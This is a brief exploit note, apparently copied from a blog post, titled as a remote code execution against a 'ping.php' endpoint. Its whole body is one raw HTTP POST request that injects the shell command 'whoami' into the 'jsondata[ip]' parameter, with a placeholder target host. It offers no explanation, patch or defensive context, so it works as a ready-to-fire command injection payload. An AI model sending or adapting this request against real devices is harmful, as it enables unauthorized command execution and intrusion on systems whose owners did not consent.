# spon_ping.php_rce
2024/1/15
from: https://blog.csdn.net/luochen2436/article/details/135504352?spm=1001.2014.3001.5502
@2
```
POST /php/ping.php HTTP/1.1
Host: your_ip
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

jsondata%5Btype%5D=123&jsondata%5Bip%5D=whoami

```
